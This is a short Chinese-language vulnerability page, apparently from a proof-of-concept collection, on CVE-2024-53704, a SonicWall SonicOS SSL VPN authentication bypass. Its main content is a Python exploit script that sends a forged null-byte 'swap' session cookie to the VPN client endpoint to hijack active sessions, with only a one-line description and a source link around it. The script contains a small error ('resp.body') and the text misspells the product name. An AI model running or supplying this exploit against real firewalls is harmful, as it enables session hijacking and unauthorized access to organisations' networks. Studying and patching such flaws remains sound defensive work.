# SonicOS-SSLVPN身份验证绕过漏洞(CVE-2024-53704)

**SonicWall防火墙的身份验证旁路，允许远程攻击者劫持Active SSL SSL VPN会话并获得未经授权的网络访问，Sononicos版本7.1.x（7.1.1-7058及以上），7.1.2-7019和8.0.0-8035受到影响**。

## poc

```python
import base64, requests, urllib3, warnings
warnings.filterwarnings("ignore", category=urllib3.exceptions.InsecureRequestWarning)
resp = requests.get(
    "https://192.168.50.189:4433/cgi-bin/sslvpnclient?launchplatform=",
    cookies={"swap": base64.b64encode(b"\x00" * 32).decode()},
    verify=False
)
print(resp.headers)
print(resp.body)
```



## 漏洞来源

- https://bishopfox.com/blog/sonicwall-cve-2024-53704-ssl-vpn-session-hijacking